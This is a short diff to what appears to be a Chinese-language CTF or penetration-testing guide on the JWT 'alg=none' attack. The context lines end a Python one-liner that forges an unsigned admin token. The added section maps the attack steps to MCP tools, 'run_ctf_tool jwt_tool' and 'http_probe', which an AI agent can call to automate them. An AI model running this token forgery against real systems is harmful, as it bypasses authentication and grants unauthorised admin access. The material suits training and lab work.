@@ -159,3 +159,12 @@ p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).
 print(f'{h}.{p}.')
 "
 ```
+
+## MCP 工具映射
+
+AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
+
+| 攻击步骤 | MCP 工具 | 说明 |
+|---------|---------|------|
+| JWT alg=none 攻击 | `run_ctf_tool jwt_tool` | 使用 jwt_tool 修改 JWT alg 为 none |
+| Token 验证 | `http_probe` | HTTP GET 探测验证无签名 token 效果 |
